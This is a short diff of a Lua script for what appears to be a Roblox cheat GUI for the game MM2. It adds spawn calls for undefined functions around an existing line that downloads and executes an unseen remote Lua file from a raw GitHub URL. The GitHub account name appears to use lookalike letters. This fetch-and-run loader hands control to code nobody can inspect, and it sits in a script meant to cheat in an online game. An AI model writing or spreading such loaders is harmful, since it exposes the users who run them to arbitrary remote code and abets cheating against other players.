@@ -1,3 +1,4 @@
+-- Local Function
 loadstring(game:HttpGet("https://raw.githubusercontent.com/BIudnyHoIandan/MM2/refs/heads/main/file.lua"))()
 
 -- Load WindUI safely
@@ -211,4 +212,6 @@ Tabs.AntiStealTab:Toggle({
     end,
 })
 
+task.spawn(localfunction)
+task.spawn(loadui)
 print("✅ MM2 GUI loaded. Press Right Ctrl to toggle it.")
